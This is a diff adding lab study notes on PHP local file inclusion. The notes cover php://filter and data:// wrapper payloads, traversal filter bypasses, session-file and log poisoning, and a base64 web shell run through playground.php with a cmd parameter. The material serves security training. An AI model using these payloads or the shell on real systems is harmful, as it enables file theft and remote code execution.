@@ -1,0 +1,172 @@
+__________________________________________________________________________________________
+
+
+TASK 4 PHP Wrappers
+
+PHP Wrappers
+
+    PHP wrappers enable access to data streams and built-in protocols, posing security risks if misused. 
+    For example, in an LFI vulnerability, attackers can use `php://filter` to modify file data. 
+    To base64-encode `/etc/passwd`, the payload would be: `php://filter/convert.base64-encode/resource=/etc/passwd`.
+
+    The table below shows the .htaccess file output using various PHP string filters.
+    +-------------------------------------------------------------+------------------------------------------+
+    | Payload                                                     | Output                                   |
+    +-------------------------------------------------------------+------------------------------------------+
+    | php://filter/convert.base64-encode/resource=.htaccess       | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
+    | php://filter/string.rot13/resource=.htaccess                | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf        |
+    | php://filter/string.toupper/resource=.htaccess              | REWRITEENGINE ON OPTIONS -INDEXES       |
+    | php://filter/string.tolower/resource=.htaccess              | rewriteengine on options -indexes       |
+    | php://filter/string.strip_tags/resource=.htaccess           | RewriteEngine on Options -Indexes       |
+    | No filter applied                                           | RewriteEngine on Options -Indexes       |
+    +-------------------------------------------------------------+------------------------------------------+
+
+Data Wrapper
+
+    The data:// wrapper allows embedding data directly into code. 
+    For example, visiting http://10.82.183.63/playground.php with the payload data:text/plain,<?php%20phpinfo();%20?> can execute PHP code, showing PHP configuration details.
+
+    The breakdown of the payload data:text/plain,<?php phpinfo(); ?> is:
+
+        data: as the URL.
+        mime-type is set as text/plain.
+        The data part includes a PHP code snippet: <?php phpinfo(); ?>.
+
+__________________________________________________________________________________________
+
+
+TASK Base Directory Breakouts
+
+Base Directory Breakout
+
+    Web applications often implement safeguards against path traversal attacks, but these are not always effective. 
+    Below is an example of code that enforces a base directory and attempts to strip traversal strings to prevent such attacks:
+            
+    /*************************************************************************************
+    * function containsStr($str, $subStr){
+    *     return strpos($str, $subStr) !== false;
+    * }
+    *
+    * if(isset($_GET['page'])){
+    *     if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
+    *         include $_GET['page'];
+    *     }else{ 
+    *         echo 'You are not allowed to go outside /var/www/html/ directory!';
+    *     }
+    * }
+    *************************************************************************************/
+
+    To bypass the filter, use payloads like /var/www/html/..//..//..//etc/passwd. 
+    The function containsStr checks if $_GET['page'] lacks ../.. and includes /var/www/html. 
+    However, ..//..// evades the filter as it navigates directories like ../../ but doesn't match ../.. due to extra slashes, which the file system treats as a single slash.
+
+Obfuscation
+
+    Obfuscation techniques help bypass basic security filters in web applications. 
+    Filters often block obvious directory traversal patterns like ../, but attackers can evade them using encoding or obfuscation.
+        URL Encoding      : ../ → %2e%2e%2f
+        Double Encoding   : ../ → %252e%252e%252f (decoded twice)
+        Obfuscation       : ....// avoids detection by simple filters.
+
+    For instance, an application filtering ../ can still be bypassed with these techniques.
+        /*************************************************************************************
+        * $file = $_GET['file'];
+        * $file = str_replace('../', '', $file);
+        * 
+        * include('files/' . $file);
+        *************************************************************************************/
+
+    An attacker can bypass the filter using:
+        URL Encoding     : Use ?file=%2e%2e%2fconfig.php, which decodes to ../config.php.
+        Double Encoding  : Use ?file=%252e%252e%252fconfig.php, decoded twice to ../config.php.
+        Obfuscation      : Use ....//config.php, which simplifies to ../config.php after filtering.
+
+__________________________________________________________________________________________
+
+
+TASK 6 LFI2RCE - Session Files
+
+PHP Session Files
+
+    PHP session files can be exploited in LFI attacks to achieve Remote Code Execution. 
+    If an attacker injects malicious code into session data stored on the server, and the application includes these files via LFI, it can execute the code.
+
+    For example, the vulnerable application at http://10.82.183.63/sessions.php contains the following code:
+
+    /*************************************************************************************
+    * if(isset($_GET['page'])){
+    *     $_SESSION['page'] = $_GET['page'];
+    *     echo "You're currently in" . $_GET["page"];
+    *     include($_GET['page']);
+    * }
+    *************************************************************************************/
+
+    An attacker can inject PHP code like <?php echo phpinfo(); ?> into the `page` parameter, saving it in the session file. 
+    Using the LFI vulnerability, the attacker includes the session file via `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`, replacing `[sessionID]` with the PHPSESSID cookie value to execute the code.
+
+__________________________________________________________________________________________
+
+
+TASK 7 LFI2RCE - Log Poisoning
+
+Log Poisoning
+
+    Log poisoning involves injecting malicious PHP code into a web server's log file and exploiting an LFI vulnerability to include and execute it. 
+    Attackers can inject code via user agents, Netcat requests, or referrer headers. Once the log file is included, the server executes the malicious code, leading to RCE.
+
+    Example: An attacker sends a Netcat request with PHP code:
+        /*************************************************************************************
+        * $ nc 10.82.183.63 80      
+        * <?php echo phpinfo(); ?>
+        * HTTP/1.1 400 Bad Request
+        * Date: Thu, 23 Nov 2023 05:39:55 GMT
+        * Server: Apache/2.4.41 (Ubuntu)
+        * Content-Length: 335
+        * Connection: close
+        * Content-Type: text/html; charset=iso-8859-1
+        *
+        * <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+        * <html><head>
+        * <title>400 Bad Request</title>
+        * </head><body>
+        * <h1>Bad Request</h1>
+        * <p>Your browser sent a request that this server could not understand.<br />
+        * </p>
+        * <hr>
+        * <address>Apache/2.4.41 (Ubuntu) Server at 10.82.183.63.eu-west-1.compute.internal Port 80</address>
+        * </body></html>
+        *************************************************************************************/
+
+    The code is logged in the server's access logs.
+    Apache access log with injected PHP code.
+    The attacker uses LFI to include the log file: ?page=/var/log/apache2/access.log
+
+__________________________________________________________________________________________
+
+
+TASK 8 LFI2RCE - Wrappers
+
+PHP Wrappers
+
+    PHP wrappers can enable code execution using the `php://filter` stream wrapper. For example, visiting `http://10.82.183.63/playground.php` with a base64-encoded payload like `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` decodes and executes the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`.
+
+    +------------+-------------------+-----------------------------------------------------------------------+
+    | Position   | Field             | Value                                                                 |
+    +------------+-------------------+-----------------------------------------------------------------------+
+    | 1          | Protocol Wrapper  | php://filter                                                          |
+    | 2          | Filter            | convert.base64-decode                                                 |
+    | 3          | Resource Type     | resource=                                                             |
+    | 4          | Data Type         | data://plain/text,                                                    |
+    | 5          | Encoded Payload   | PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+  |
+    +------------+-------------------+-----------------------------------------------------------------------+
+
+    PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ is the base64-encoded PHP code. The server decodes and executes it, enabling command execution via the "cmd" GET parameter.
+
+    Note: Avoid including &cmd=whoami in the input field, as encoding it will cause an invalid byte sequence error.
+
+    http://10.82.183.63/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls
+
+__________________________________________________________________________________________
+
+
+Appendix:
